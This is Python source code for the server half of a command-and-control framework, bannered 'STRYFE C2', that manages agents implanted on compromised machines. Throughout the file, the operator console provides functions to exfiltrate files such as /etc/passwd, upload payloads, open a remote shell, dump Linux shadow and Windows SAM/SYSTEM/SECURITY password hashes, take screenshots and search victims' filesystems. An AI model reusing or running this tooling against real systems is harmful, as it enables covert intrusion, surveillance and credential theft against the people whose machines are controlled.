import socket, threading, ssl
import secrets, os, platform, json
from agent import Agent
from symbols import *
import select, datetime
from prompt_toolkit import PromptSession

DATA_CHUNK_SIZE = 1024


class Server:

    ####################################################################################################################
    ################################################# CONSTRUCTOR ######################################################
    ####################################################################################################################
                                                                      
    def __init__(self, address, port):
        self.address = address
        self.port = port
        self.agents = []
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.current_id = 1
        self.platform = platform.system()  # Initialize the C2 platform
        self.stop_event = threading.Event()  # Test to stop threads
        self.current_agent = Agent(['',''],'',0)  # Dummy agent for initialisation
        self.is_exited = False
        self.banner = """
        ███████╗████████╗██████╗ ██╗   ██╗███████╗███████╗     ██████╗██████╗ 
        ██╔════╝╚══██╔══╝██╔══██╗╚██╗ ██╔╝██╔════╝██╔════╝    ██╔════╝╚════██╗
        ███████╗   ██║   ██████╔╝ ╚████╔╝ █████╗  █████╗      ██║      █████╔╝
        ╚════██║   ██║   ██╔══██╗  ╚██╔╝  ██╔══╝  ██╔══╝      ██║     ██╔═══╝ 
        ███████║   ██║   ██║  ██║   ██║   ██║     ███████╗    ╚██████╗███████╗
        ╚══════╝   ╚═╝   ╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚══════╝     ╚═════╝╚══════╝
"""

        self.commands = {
            'agents': {
                'function': self.display_agents,
                'description': 'List all connected agents'
            },
            'agent': {
                'function': self.select_agent,
                'description': 'Select an agent by ID | ID: Integer | Ex: agent 3'
            },
            'bg': {
                'function': self.background,
                'description': 'Deselect the current agent'
            },
            'kill': {
                'function': self.kill_agent,
                'description': 'Kill an agent by id | ID: Integer | kill 4'
            },
            'exec': {
                'function': self.exec,
                'description': 'Execute a system command in the local machine'
            },
            'help': {
                'function': self.help,
                'description': 'Show this help message'
            },
            'exit': {
                'function': self.exit,
                'description': 'Exit the server'
            }
        }

        self.agent_commands = {
            'download': {
                'function': self.download,
                'description': 'Download the specified files | FILE: String | Ex: download /etc/passwd /etc/hosts'
            },
            'upload': {
                'function': self.upload,
                'description': 'Upload a file to selected target | LOCAL_FILE: String   REMOTE_DEST: String | upload payload.exe /tmp/payload.exe'
            },
            'search': {
                'function': self.search,
                'description': 'Search a file on the target\'s filesystem '
            },
            'shell': {
                'function': self.shell,
                'description': 'Open a reverse shell from the selected agent (type exit to quit the shell) (not interactive)'
            },
            'hashdump': {
                'function': self.hashdump,
                'description': 'Dump the hashes from the target (may crash on Windows)'
            },
            'ipconfig': {
                'function': self.ipconfig,
                'description': 'Retrieve the IP Configuration from the current target '
            },
            'screenshot': {
                'function': self.screenshot,
                'description': 'Take a screenshot from the selected agent, you can optionally specify a name for the screenshot | Optional: FILE: String | screenshot [my_screenshot]'
            }
        }

        self.agent_checker_thread = threading.Thread(target=self.check_agents)
        self.agent_checker_thread.start()

    def __str__(self):
        return f"Server: {len(self.agents)} agents connected"

    ####################################################################################################################
    ########################################### SERVER MANAGEMENT ######################################################
    ####################################################################################################################

    def start(self):
        """Start the server, socket initialization, binding, listening and creation of SSL context for encryption"""
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.bind((self.address, self.port))
        self.sock.listen(5)

        self.context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        self.context.load_cert_chain(certfile="server.crt", keyfile="server.key")

        print(self.banner)
        threading.Thread(target=self.accept_connections).start()

    def main_loop(self):
        session = PromptSession()
        while True:
            active_agent = f"[{len(self.agents)} active]" if self.current_agent.id == 0 else f"[Agent {self.current_agent.id}]"
            try:
                command = session.prompt(f"{active_agent}> ").strip()

                if command:
                    command_name, *args = command.split(' ')
                    command_name = command_name.lower()
                    if command_name in self.commands:
                        self.commands[command_name]['function'](' '.join(args))
                    elif command_name in self.agent_commands:
                        if self.is_agent_selected():
                            self.agent_commands[command_name]['function'](' '.join(args))
                    else:
                        print(f"Unknown command: {command_name}")
            except KeyboardInterrupt:
                self.exit()

    ####################################################################################################################
    ########################################### CONNECTION HANDLING ####################################################
    ####################################################################################################################

    def handle_client(self, client_socket):
        """
        Receive basic information about the target:
        - MAC address in integer
        - User running the agent
        - UID of the agent (see getClientUID method in client)
        @param client_socket: the socket of the client
        """

        json_string = client_socket.recv(4096).decode()
        if not json_string:
            return
        json_object = json.loads(json_string)

        agent = self.new_agent(client_socket.getpeername(), client_socket)

        agent.hostname = json_object['hostname']
        agent.user = json_object['user']
        agent.mac = json_object['mac']
        agent.uid = json_object['uid']
        agent.os = json_object['os']

    def accept_connections(self):
        """Loop accepting incoming connections"""
        while not self.stop_event.is_set():
            if self.is_exited:
                return
            client_socket, client_address = self.sock.accept()
            try:
                client_socket = self.context.wrap_socket(client_socket, server_side=True)
                self.handle_client(client_socket)
            except ssl.SSLError as e:
                print(f"SSL error: {e}")
            except OSError:
                pass

    def close_all_connections(self):
        for agent in self.agents:
            agent.sock.close()

    ####################################################################################################################
    ############################################## USUAL METHODS #######################################################
    ####################################################################################################################
    def simple_ssl_connection(self):
        """ Perform a simple SSL connection to the listening socket. Must be used to exit the server """
        # open connection socket to the listening socket. SSL connection
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        secure_sock = context.wrap_socket(sock, server_hostname=self.address)

        secure_sock.connect((self.address, self.port))

    def help(self, args=None):
        """Print help for commands"""
        print("\nAvailable Commands:")
        print("=" * 20)
        for cmd, info in self.commands.items():
            print(f"{cmd:<12}: {info['description']}")
        print("=" * 20 + " ONCE AGENT SELECTED:")
        for cmd, info in self.agent_commands.items():
            print(f"{cmd:<12}: {info['description']}")
        print("=" * 20)
        print("Usage:")
        print("  command [args]\n")

    def send_file(self, file_path):
        """
        generic function to send a file to the agent.
        @param file_path: the path of the file to send
        """
        try:
            with open(file_path, 'rb') as f:
                while chunk := f.read(DATA_CHUNK_SIZE):
                    self.current_agent.sock.sendall(chunk)
            self.current_agent.sock.sendall(SIG_EOF)
            print(f'File sent: {file_path} ({os.path.getsize(file_path)} b)')
        except Exception:
            print("File not found")
            self.current_agent.sock.sendall(FILE_NOT_FOUND)

    def get_file(self, file_path):
        """
        generic function to get a file from the agent.
        @param file_name: the path of the file to get
        """
        file_length = 0
        try:
            with open(file_path, 'w+b') as f:
                while True:
                    data = self.current_agent.sock.recv(DATA_CHUNK_SIZE)
                    if data == SIG_EOF or not data:
                        break
                    if data == FILE_NOT_FOUND:
                        print(f"ERROR: {file_path} not found on the target.")
                        os.remove(file_path)
                        return
                    elif data == ERROR_INSUFFICIENT_PERMS:
                        print(f"ERROR: Insufficient permissions to get {file_path}.")
                        os.remove(file_path)
                        return
                    f.write(data)
                    file_length += len(data)
            print(f'File saved at {file_path} ({file_length} b)')
        except Exception as e:
            print(f"Error: {e}")
            os.remove(file_path)

    def get_file_without_path(self, remote_file_path):
        self.download_folder_creation()
        file_name = os.path.basename(remote_file_path)
        full_path = os.path.join(self.get_download_folder_path(), file_name)
        self.get_file(full_path)

    def get_download_folder_path(self):
        """Get the path of the folder where the downloaded files will be stored"""
        folder_name = f"{self.current_agent.ip} - {self.current_agent.user}@{self.current_agent.hostname}"
        return os.path.join(os.getcwd(), folder_name)

    def download_folder_creation(self):
        """Create a folder to store the downloaded files if it doesn't exist"""
        full_local_path = self.get_download_folder_path()
        # Check if the folder exists
        if not os.path.exists(full_local_path):
            os.mkdir(full_local_path)

    def is_socket_alive(self, sock):
        """Check if the agents are still alive by checking the readability of the socket"""
        try:
            sock.settimeout(5)
            # Passing the socket we want to check for readability in first argument with a timeout of 0.5 seconds
            read_ready, _, _ = select.select([sock], [], [], 5)
            if read_ready:
                data = sock.recv(1)
                if data == b'':
                    return False
            return True
        except Exception:
            return False

    ####################################################################################################################
    ########################################### AGENT MANAGEMENT #######################################################
    ####################################################################################################################

    def new_agent(self, client_address, client_socket):
        agent_id = self.current_id
        agent = Agent(client_address, client_socket, agent_id)
        self.current_id += 1
        print(f"\n[!] New connection:\n{agent}")
        self.add_agent(agent)
        return agent

    def add_agent(self, agent_to_add: 'Agent'):
        """Add an agent to the C2 list"""
        self.agents.append(agent_to_add)

    def kill_agent(self, id):
        try:
            id = int(id)
            found_flag = False
            for index, agent in enumerate(self.agents):
                if agent.id == id:
                    found_flag = True
                    agent.sock.sendall("kill".encode())
                    agent.sock.close()
                    self.agents.pop(index)
                    break
                if not found_flag:
                    print(f"No agent with ID {id}")
            if self.current_agent.id == id:
                self.current_agent = Agent(['',''],'',0)  # Reset with a dummy agent
        except ValueError:
            print("Agent ID needs to be an Integer")
        except OSError:
            pass

    def get_agent(self, id):
        """ Get the agent object by ID """
        for agent in self.agents:
            if agent.id == id:
                return agent

    def select_agent(self, args):
        try:
            id = int(args)
        except ValueError:
            print("Agent ID needs to be an Integer")
            return
        for agent in self.agents:
            if agent.id == id:
                self.current_agent = self.get_agent(id)
                return
        print(f"No agent with ID {id}")

    def display_agents(self, args=None):
        """Display all connected agents"""
        if self.agents:
            print("")
            print("=" * 80)
            print(f"{'ID':<5}{'Connection':<23}{'Session':<25}{'Uptime':<15}{'OS'}")
            print("-" * 80)
            for agent in self.agents:
                print(f"{agent.id:<5}{agent.ip + ':' + str(agent.port):<23}{agent.user + '@' + agent.hostname:<25}{self.get_agent_uptime(agent):<15}{agent.os}")
            print("=" * 80)
            print("")
        else:
            print("No agents connected")

    def is_agent_selected(self):
        if self.current_agent.id != 0:
            return True
        else:
            print("Please select an agent")

    def check_agents(self):
        """Kill the agents if we can't contact them"""
        while True:
            if self.is_exited:
                return
            for agent in self.agents:
                if not self.is_socket_alive(agent.sock):
                    print(f"\nAgent {agent.id} died ({agent.ip})")
                    self.kill_agent(agent.id)
            self.stop_event.wait(2)

    def get_agent_uptime(self, agent):
        timestamp = datetime.datetime.now()

        difference = timestamp - datetime.datetime.fromisoformat(agent.timestamp)
        days = difference.days

        # Retrieving days, hours, minutes and seconds from the difference
        hours, remainder = divmod(difference.seconds, 3600)
        minutes, seconds = divmod(remainder, 60)

        # Add days hours minute to the list only if they are greater than zero to skip useless data
        result = [f"{value}{name}" for value, name in [(days, "d"), (hours, "h"), (minutes, "m"), (seconds, "s")] if
                  value > 0]

        # join the list to a string
        return ' '.join(result)

    ####################################################################################################################
    ########################################### SERVER COMMANDS ########################################################
    ####################################################################################################################

    def background(self, args=None):
        """ Unselect the current agent """
        self.current_agent = Agent(['', ''], '', 0)

    def exec(self, args):
        """ Execute a system command in the local machine """
        os.system(args)

    def exit(self, args=None):
        print("\nClosing server...")
        # unblock the listener
        self.simple_ssl_connection()
        self.server_socket.close()
        self.stop_event.set()
        self.close_all_connections()
        self.is_exited = True
        exit(0)

    ####################################################################################################################
    ########################################### CLIENT COMMANDS ########################################################
    ####################################################################################################################

    def download(self, args):
        self.current_agent.sock.sendall(f"upload {args}".encode())
        args = list(filter(lambda x: x != "", args.split(" ")))
        if len(args) < 1:
            print("Please select at least one remote file to download\n\tEx: download /etc/passwd")
            return
        for file_path in args:
            self.get_file_without_path(file_path)

    def upload(self, args):
        args = list(filter(lambda x: x != "", args.split(" ")))
        if len(args) < 2:
            print("Please select a local file path and a remote path\n\tEx: upload payload.exe C:\\Users\\john\\Desktop\\payload.exe")
            return
        self.current_agent.sock.sendall(f"download {args[1]}".encode())
        self.send_file(args[0])

    def shell(self, args=None):
        """ Enter in shell mode. The commands are sent to the agent and the output is displayed """
        self.current_agent.sock.sendall("shell".encode())
        session = PromptSession()
        while True:
            command = session.prompt('$> ').strip()
            if command == '':
                continue
            if command.lower() == 'exit':
                self.current_agent.sock.sendall("exit".encode())
                break
            self.current_agent.sock.sendall(command.encode())
            print(self.current_agent.sock.recv(8192).decode('latin1'))

    def search(self,args):
        args = list(filter(lambda x: x != "", args.split(" ")))
        if len(args) < 2:
            print("Please specify a starting path and a file name\n\tEx: search C:\\ Unattend.xml")
            return
        self.current_agent.sock.sendall(f"search {args[0]} {args[1]}".encode())
        while True:
            data = self.current_agent.sock.recv(DATA_CHUNK_SIZE)
            decoded_data = data.decode("latin1")
            if (data == SIG_EOF) or (not data):
                break
            print('---')
            print(decoded_data)

    def hashdump(self, args=None):
        files = []
        # file names
        shadow_filename = "shadow"
        sam_filename = "sam"
        system_filename = "system"
        security_filename = "security"
        # set files to extract based on the OS
        if self.current_agent.os == "Linux":
            files.append(shadow_filename)
        elif self.current_agent.os == "Windows":
            files.append(sam_filename)
            files.append(system_filename)
            files.append(security_filename)
        else:
            print("OS not supported")
            return
        # send the command to the agent
        self.current_agent.sock.sendall("hashdump".encode())
        for i in range(len(files)):
            self.get_file_without_path(files[i])

    def ipconfig(self, args=None):
        self.current_agent.sock.sendall("ipconfig".encode())
        data = self.current_agent.sock.recv(16384)
        print("\n" + data.decode('utf-8'))

    def screenshot(self, args):
        self.current_agent.sock.sendall("screenshot".encode())
        args = list(filter(lambda x: x != "", args.split(" ")))
        if len(args) >= 1:
            screen_path = f"{args[0]}.jpg"
        else:
            screen_path = f"{secrets.token_hex(5)}.jpg"
        with open(screen_path, 'wb') as f:
            while True:
                data = self.current_agent.sock.recv(DATA_CHUNK_SIZE)
                if (data == SIG_EOF) or (not data):
                    break
                f.write(data)
        print(f'Screenshot saved at {screen_path}')
